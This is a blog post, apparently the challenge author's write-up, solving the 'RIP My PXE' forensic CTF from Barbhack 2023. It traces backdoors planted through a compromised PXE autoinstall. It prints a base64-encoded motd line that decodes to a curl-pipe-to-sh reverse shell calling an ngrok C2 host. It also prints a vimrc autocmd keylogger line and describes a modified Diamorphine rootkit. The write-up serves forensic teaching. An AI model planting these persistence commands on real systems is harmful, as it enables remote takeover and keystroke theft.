@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+  <script defer data-domain="itarow.xyz" src="https://plausible.itarow.xyz/js/plausible.js"></script>
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title> Barbhack 2023 - RIP My PXE - Forensic | Itarow</title>
+  <link rel = 'canonical' href = 'https://blog.itarow.xyz/posts/rip_my_pxe/'>
+  <meta name="description" content="CS student, writing some write up of cool CTF&#39;s challenges and infosec content.">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="all,follow">
+  <meta name="googlebot" content="index,follow,snippet,archive">
+  <meta property="og:title" content="Barbhack 2023 - RIP My PXE - Forensic" />
+<meta property="og:description" content="Here is the solution of the challenge &ldquo;RIP My PXE&rdquo; which I create for barbhack CTF, the challenge is divided in three parts.
+Step 1 Unfortunately! Our company&rsquo;s PXE server and our super autoinstall were compromised and our new employees installed their PCs afterwards &hellip; Here&rsquo;s the dump of one of the machines we think has been compromised, please help us understand what the attacker has done. A first backdoor has been inserted so that the attacker can retrieve a shell, please find the domain, the port of the attacker&rsquo;s C2, as well as the binary that triggers the backdoor." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://blog.itarow.xyz/posts/rip_my_pxe/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-08-27T20:58:44+02:00" />
+<meta property="article:modified_time" content="2023-08-27T20:58:44+02:00" />
+
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Barbhack 2023 - RIP My PXE - Forensic"/>
+<meta name="twitter:description" content="Here is the solution of the challenge &ldquo;RIP My PXE&rdquo; which I create for barbhack CTF, the challenge is divided in three parts.
+Step 1 Unfortunately! Our company&rsquo;s PXE server and our super autoinstall were compromised and our new employees installed their PCs afterwards &hellip; Here&rsquo;s the dump of one of the machines we think has been compromised, please help us understand what the attacker has done. A first backdoor has been inserted so that the attacker can retrieve a shell, please find the domain, the port of the attacker&rsquo;s C2, as well as the binary that triggers the backdoor."/>
+
+  
+  
+    
+  
+  
+  <link rel="stylesheet" href="https://blog.itarow.xyz/css/styles.4dd8e96d6c0d53a6965a5a357c26fc29f6b838ad352dc5acda0754ff4b9409e5c58fa94716892c2a5d6a7e1b1bef8fbcaf2442656e81dfae00dc9464d707477d.css" integrity="sha512-TdjpbWwNU6aWWlo1fCb8Kfa4OK01LcWs2gdU/0uUCeXFj6lHFoksKl1qfhsb74&#43;8ryRCZW6B364A3JRk1wdHfQ=="> 
+
+  
+  
+  
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  
+
+  
+<link rel="icon" type="image/png" href="https://blog.itarow.xyz/images/favicon.ico" />
+
+  
+  
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+  <div class="content index py4">
+
+  <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/categories">Categories</a></li>
+         
+        <li><a href="/whoami">Whoami</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li>
+          <a class="icon" href=" https://blog.itarow.xyz/posts/baleine_sous_graviers/" aria-label="Previous">
+            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
+          </a>
+        </li>
+        
+        
+        <li>
+          <a class="icon" href="https://blog.itarow.xyz/posts/pacapable/" aria-label="Next">
+            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
+          </a>
+        </li>
+        
+        <li>
+          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
+          </a>
+        </li>
+        <li>
+          <a class="icon" href="#" aria-label="Share">
+            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
+          </a>
+        </li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fblog.itarow.xyz%2fposts%2frip_my_pxe%2f" aria-label="Facebook">
+      <i class="fab fa-facebook " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2frip_my_pxe%2f&text=Barbhack%202023%20-%20RIP%20My%20PXE%20-%20Forensic" aria-label="Twitter">
+      <i class="fab fa-twitter " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2frip_my_pxe%2f&title=Barbhack%202023%20-%20RIP%20My%20PXE%20-%20Forensic" aria-label="Linkedin">
+      <i class="fab fa-linkedin " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2frip_my_pxe%2f&is_video=false&description=Barbhack%202023%20-%20RIP%20My%20PXE%20-%20Forensic" aria-label="Pinterest">
+      <i class="fab fa-pinterest " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=Barbhack%202023%20-%20RIP%20My%20PXE%20-%20Forensic&body=Check out this article: https%3a%2f%2fblog.itarow.xyz%2fposts%2frip_my_pxe%2f" aria-label="Email">
+      <i class="fas fa-envelope " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2frip_my_pxe%2f&title=Barbhack%202023%20-%20RIP%20My%20PXE%20-%20Forensic" aria-label="Pocket">
+      <i class="fab fa-get-pocket " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2frip_my_pxe%2f&title=Barbhack%202023%20-%20RIP%20My%20PXE%20-%20Forensic" aria-label="reddit">
+      <i class="fab fa-reddit " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2frip_my_pxe%2f&name=Barbhack%202023%20-%20RIP%20My%20PXE%20-%20Forensic&description=Here%20is%20the%20solution%20of%20the%20challenge%20%26ldquo%3bRIP%20My%20PXE%26rdquo%3b%20which%20I%20create%20for%20barbhack%20CTF%2c%20the%20challenge%20is%20divided%20in%20three%20parts.%0aStep%201%20Unfortunately%21%20Our%20company%26rsquo%3bs%20PXE%20server%20and%20our%20super%20autoinstall%20were%20compromised%20and%20our%20new%20employees%20installed%20their%20PCs%20afterwards%20%26hellip%3b%20Here%26rsquo%3bs%20the%20dump%20of%20one%20of%20the%20machines%20we%20think%20has%20been%20compromised%2c%20please%20help%20us%20understand%20what%20the%20attacker%20has%20done.%20A%20first%20backdoor%20has%20been%20inserted%20so%20that%20the%20attacker%20can%20retrieve%20a%20shell%2c%20please%20find%20the%20domain%2c%20the%20port%20of%20the%20attacker%26rsquo%3bs%20C2%2c%20as%20well%20as%20the%20binary%20that%20triggers%20the%20backdoor." aria-label="Tumblr">
+      <i class="fab fa-tumblr " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fblog.itarow.xyz%2fposts%2frip_my_pxe%2f&t=Barbhack%202023%20-%20RIP%20My%20PXE%20-%20Forensic" aria-label="Hacker News">
+      <i class="fab fa-hacker-news " aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+    
+    <div id="toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#step-1">Step 1</a></li>
+    <li><a href="#step-2">Step 2</a></li>
+    <li><a href="#step-3">Step 3</a></li>
+  </ul>
+</nav>
+    </div>
+    
+  </span>
+</div>
+
+
+  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+      <h1 class="posttitle" itemprop="name headline">
+        Barbhack 2023 - RIP My PXE - Forensic
+      </h1>
+      <div class="meta">
+        
+        <div class="postdate">
+          
+          <time datetime="2023-08-27 20:58:44 &#43;0200 CEST" itemprop="datePublished">2023-08-27</time>
+          
+        </div>
+        
+        
+        <div class="article-read-time">
+          <i class="far fa-clock"></i>
+          
+          5 minute read
+        </div>
+        
+        
+        <div class="article-category">
+            <i class="fas fa-archive"></i>
+            
+            
+            <a class="category-link" href="/categories/barbhack-2023">Barbhack 2023</a>
+            
+        </div>
+        
+        
+        <div class="article-tag">
+            <i class="fas fa-tag"></i>
+            
+            
+            <a class="tag-link" href="/tags/forensic" rel="tag">Forensic</a>
+            
+             ,  
+            <a class="tag-link" href="/tags/ctf" rel="tag">CTF</a>
+            
+        </div>
+        
+      </div>
+    </header>
+
+  
+    
+    <div class="content" itemprop="articleBody">
+      <p>Here is the solution of the challenge &ldquo;RIP My PXE&rdquo; which I create for barbhack CTF, the challenge is divided in three parts.</p>
+<h2 id="step-1">Step 1</h2>
+<blockquote>
+<p>Unfortunately! Our company&rsquo;s PXE server and our super autoinstall were compromised and our new employees installed their PCs afterwards &hellip; Here&rsquo;s the dump of one of the machines we think has been compromised, please help us understand what the attacker has done. A first backdoor has been inserted so that the attacker can retrieve a shell, please find the domain, the port of the attacker&rsquo;s C2, as well as the binary that triggers the backdoor. Format: <code>brb{Domain:PORT:binary_name}</code> &amp; example: <code>brb{barbhack.co.uk:1337:ls}</code></p>
+</blockquote>
+<p>The challenge gives us an ova file, which is a virtual machine archive. We could mount it or boot it with an hypervisor like Virtual Box or VMWare.</p>
+<p>The description was important to understand.RIP_My_PXE//</p>
+<p>We know the virtual machine was installed with the backdoored PXE server.</p>
+<p>A PXE server is a server which allows machines to get installed without USB device, It works with the network, the option to boot in PXE is available in the BIOS.</p>
+<p>The description also talked about autoinstall which is a feature with ubuntu server iso to provide some files, configurations, commands, automatically after the installation of the iso. It could be combined with the PXE server to install automatically the system.</p>
+<p>We know the attacker compromise the PXE server, so he is able to backdoor the autoinstall configuration, this is a YAML file which is present on the server.</p>
+<p>Let’s mount the image, which is an LVM volume :</p>
+<pre tabindex="0"><code>$ sudo modprobe nbd
+$ sudo qemu-nbd -c /dev/nbd1 ./ubuntu-disk001.vmdk
+$ sudo vgchange -ay
+$ sudo lvscan
+$ sudo lvdisplay
+$ sudo mount -o ro,noload /dev/ubuntu-vg/ubuntu-lv /mnt
+</code></pre><p>We could make a simple google search which allows us to find the path of the autoinstall log files : <a href="https://askubuntu.com/questions/447742/how-do-i-obtain-log-info-from-the-installer">https://askubuntu.com/questions/447742/how-do-i-obtain-log-info-from-the-installer</a></p>
+<blockquote>
+<p>The installer logs to /var/log/installer</p>
+</blockquote>
+<p>In this folder we have the <code>installer-journal.txt</code> file which gives us the runned commands.</p>
+<p><img src="/img/RIP_My_PXE/1.png" alt=""></p>
+<p>This one is interesting :</p>
+<pre tabindex="0"><code>echo &#39;echo -n Y3VybCBodHRwczovL3JldmVyc2Utc2hlbGwuc2gvMC50Y3AuZXUubmdyb2suaW86MTcyMjQgfCBzaCAgJg== | base64 -d | sh&#39; &gt;&gt; /target/etc/update-motd.d/00-header
+</code></pre><p>If we decode the base64 :</p>
+<pre tabindex="0"><code>$ echo -n &#39;Y3VybCBodHRwczovL3JldmVyc2Utc2hlbGwuc2gvMC50Y3AuZXUubmdyb2suaW86MTcyMjQgfCBzaCAgJg==&#39; | base64 -d
+curl https://reverse-shell.sh/0.tcp.eu.ngrok.io:17224 | sh  &amp;
+</code></pre><p>We have the backdoor, reverse-shell.sh is a website which contains a reverse shell bash script for the domain/ip and port which are in the URL.</p>
+<p>The domain is <code>0.tcp.eu.ngrok.io</code> and the port <code>17224</code>.</p>
+<p>Now we need to find the binary which trigger the backdoor. The backdoor is placed on a motd file.</p>
+<blockquote>
+<p>The contents of /etc/motd are displayed by login(1) after a successful login but just before it executes the login shell. The abbreviation &ldquo;motd&rdquo; stands for &ldquo;message of the day&rdquo;, and this file has been traditionally used for exactly that (it requires much less disk space than mail to all users).</p>
+</blockquote>
+<p>So we know the script is going to be trigger on a login, the most common binary which trigger it is <code>ssh</code> (all the checks and prompt when we connect to a server are the commands from /etc/update-motd.d/&hellip;)</p>
+<p>Flag : <code>brb{0.tcp.eu.ngrok.io:17224:ssh}</code></p>
+<h2 id="step-2">Step 2</h2>
+<blockquote>
+<p>After having obtained this access, a second backdoor was inserted on the system, this one would be similar to a specific kind of keylogger according to our information, please find the modified file as well as the ouput file of this backdoor.
+Format: <code>brb{path_fichier_absolu:path_fichier_output}</code>
+Example: <code>brb{/etc/passwd:/etc/issue}</code></p>
+</blockquote>
+<p>Now we know the attacker get a shell on the machine from the ssh command in the .bash_history.</p>
+<p>We need to find a specific keylogger for a software in the system.</p>
+<p>There were two solutions, make a timeline and search for recent modifications files or enumerate the binary which could be abuse to record keystrokes.</p>
+<p>There were vim and nano commands in the bash_history, this could be interesting to look for backdoored configurations of it.</p>
+<p>There is the vimrc files and the nanorc files.</p>
+<p>When we look at the common <code>/etc/vim/vimrc</code> file, we found something interesting :</p>
+<p><img src="/img/RIP_My_PXE///2.png" alt=""></p>
+<p><code>:autocmd BufWritePost * :silent :w! /dev/shm/.m' &gt;&gt; /etc/vim/vimrc</code></p>
+<p>This is the backdoor, an autocommand which record the keystrokes in the <code>/dev/shm/.m</code></p>
+<p>This gives us the flag : <code>brb{/etc/vim/vimrc:/dev/shm/.m}</code></p>
+<p>A timeline or most recent files could be done, and it permits to find a /etc/vim/vimrc quickly.</p>
+<p>This is the tweet which inspired me for this step : <a href="https://twitter.com/Alh4zr3d/status/1631655900560629760?s=20">https://twitter.com/Alh4zr3d/status/1631655900560629760?s=20</a></p>
+<h2 id="step-3">Step 3</h2>
+<blockquote>
+<p>A final backdoor is hidden, this one seems more advanced, it has encrypted one of our employee&rsquo;s files. Please decrypt the file and give us the sha256sum of the file in proof. We would also like to know which command was used to encrypt the file, and finally, please find the absolute path of the malicious element you have identified.
+Format: <code>brb{sha1sum:sha1sum(command):path_absolute_element}</code></p>
+</blockquote>
+<p>An advanced backdoor on linux could make us think of a thing related to the linux kernel.</p>
+<p>The file which was encrypted is <code>/root/confidential.enc</code>, his length is 32 bytes, so it could make us think about an AES encryption.</p>
+<p>If we check the log files we could find some cool things, the /var/log/syslog for example :</p>
+<p><img src="/img/RIP_My_PXE//3.png" alt=""></p>
+<p>There is a kernel module which was loaded and a signature failed.</p>
+<p>We could also check the autoload module file (/etc/modules) :</p>
+<pre tabindex="0"><code>$ cat etc/modules
+# /etc/modules: kernel modules to load at boot time.
+#
+# This file contains the names of kernel modules that should be loaded
+# at boot time, one per line. Lines beginning with &#34;#&#34; are ignored.
+
+tutor2
+</code></pre><p>There is also this tutor2 string.</p>
+<pre tabindex="0"><code>$ fd tutor2.ko
+usr/lib/modules/5.15.0-79-generic/kernel/drivers/tutor2.ko
+</code></pre><p>The module is in the file system, so we could fire up IDA to reverse it.
+<img src="/img/RIP_My_PXE//4.png" alt=""></p>
+<p>We have the symbol, so it gives us the name of the rootkit LKM which is <a href="https://github.com/m0nad/Diamorphine">diamorphine</a></p>
+<p>If we check quickly the code on the github and the instructions command, we could find the commands which allows us to trigger actions from the module.</p>
+<p>It hooks signals to act if the signal number is handled by the module.</p>
+<p><img src="/img/RIP_My_PXE//5.png" alt=""></p>
+<p>Here is the flow graph of the hacked_kill function, we found that there is a new code which was added, the handle of the signal 60 which call the encrypt_file function :</p>
+<p><img src="/img/RIP_My_PXE//6.png" alt=""></p>
+<p>The function is very simple, it read the file &ldquo;/root/encrypted&rdquo; (xor strings), encrypt it with AES ECB so no IV and we have the key :</p>
+<p><img src="/img/RIP_My_PXE//7.png" alt=""></p>
+<p>A quick python script allows us to decrypt the file :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> AES
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util.Padding <span style="color:#f92672">import</span> unpad
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt_aes_ecb</span>(key, encrypted_data):
+</span></span><span style="display:flex;"><span>    cipher <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(key, AES<span style="color:#f92672">.</span>MODE_ECB)
+</span></span><span style="display:flex;"><span>    decrypted_data <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>decrypt(encrypted_data)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> decrypted_data
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xde\xad\x01\x02\xca\xfe\x01\x02\xde\xad\x01\x02\xca\xfe\x01\x02</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>encrypted_data <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;./confidential.enc&#39;</span>,<span style="color:#e6db74">&#39;rb&#39;</span>)<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>decrypted_data <span style="color:#f92672">=</span> decrypt_aes_ecb(key, encrypted_data)
+</span></span><span style="display:flex;"><span>print(decrypted_data<span style="color:#f92672">.</span>decode(),end<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>)
+</span></span></code></pre></div><pre tabindex="0"><code>$ python3 script.py
+this iswhere Istore my secnotes
+</code></pre><p>Now the just have to assemble the flag :</p>
+<pre tabindex="0"><code>$ python3 script.py | sha1sum
+edd77f2739e640c250e91b0971d5e44c6c52f6f6  -
+</code></pre><pre tabindex="0"><code>$ echo -n &#39;kill -60 0&#39; | sha1sum
+e2d56ff09ba74b97c57b3a77a74256979bf78c0a  -
+</code></pre><p>Flag : <code>brb{edd77f2739e640c250e91b0971d5e44c6c52f6f6:e2d56ff09ba74b97c57b3a77a74256979bf78c0a:/usr/lib/modules/5.15.0-79-generic/kernel/drivers/tutor2.ko}</code></p>
+
+    </div>
+  </article>
+
+  
+  
+
+
+
+
+
+  <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/categories">Categories</a></li>
+         
+          <li><a href="/whoami">Whoami</a></li>
+        
+      </ul>
+    </div>
+
+    
+    <div id="toc-footer" style="display: none">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#step-1">Step 1</a></li>
+    <li><a href="#step-2">Step 2</a></li>
+    <li><a href="#step-3">Step 3</a></li>
+  </ul>
+</nav>
+    </div>
+    
+
+    <div id="share-footer" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fblog.itarow.xyz%2fposts%2frip_my_pxe%2f" aria-label="Facebook">
+      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2frip_my_pxe%2f&text=Barbhack%202023%20-%20RIP%20My%20PXE%20-%20Forensic" aria-label="Twitter">
+      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2frip_my_pxe%2f&title=Barbhack%202023%20-%20RIP%20My%20PXE%20-%20Forensic" aria-label="Linkedin">
+      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2frip_my_pxe%2f&is_video=false&description=Barbhack%202023%20-%20RIP%20My%20PXE%20-%20Forensic" aria-label="Pinterest">
+      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=Barbhack%202023%20-%20RIP%20My%20PXE%20-%20Forensic&body=Check out this article: https%3a%2f%2fblog.itarow.xyz%2fposts%2frip_my_pxe%2f" aria-label="Email">
+      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2frip_my_pxe%2f&title=Barbhack%202023%20-%20RIP%20My%20PXE%20-%20Forensic" aria-label="Pocket">
+      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2frip_my_pxe%2f&title=Barbhack%202023%20-%20RIP%20My%20PXE%20-%20Forensic" aria-label="reddit">
+      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2frip_my_pxe%2f&name=Barbhack%202023%20-%20RIP%20My%20PXE%20-%20Forensic&description=Here%20is%20the%20solution%20of%20the%20challenge%20%26ldquo%3bRIP%20My%20PXE%26rdquo%3b%20which%20I%20create%20for%20barbhack%20CTF%2c%20the%20challenge%20is%20divided%20in%20three%20parts.%0aStep%201%20Unfortunately%21%20Our%20company%26rsquo%3bs%20PXE%20server%20and%20our%20super%20autoinstall%20were%20compromised%20and%20our%20new%20employees%20installed%20their%20PCs%20afterwards%20%26hellip%3b%20Here%26rsquo%3bs%20the%20dump%20of%20one%20of%20the%20machines%20we%20think%20has%20been%20compromised%2c%20please%20help%20us%20understand%20what%20the%20attacker%20has%20done.%20A%20first%20backdoor%20has%20been%20inserted%20so%20that%20the%20attacker%20can%20retrieve%20a%20shell%2c%20please%20find%20the%20domain%2c%20the%20port%20of%20the%20attacker%26rsquo%3bs%20C2%2c%20as%20well%20as%20the%20binary%20that%20triggers%20the%20backdoor." aria-label="Tumblr">
+      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fblog.itarow.xyz%2fposts%2frip_my_pxe%2f&t=Barbhack%202023%20-%20RIP%20My%20PXE%20-%20Forensic" aria-label="Hacker News">
+      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      
+        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
+          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
+          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
+          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+
+  <footer id="footer">
+  <div class="footer-left">
+    Copyright  &copy; 2024  Itarow 
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/categories">Categories</a></li>
+         
+        <li><a href="/whoami">Whoami</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+  </div>
+</body>
+
+<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
+<script src=/lib/jquery/jquery.min.js></script>
+<script src=/js/main.js></script>
+
+
+
+</html>
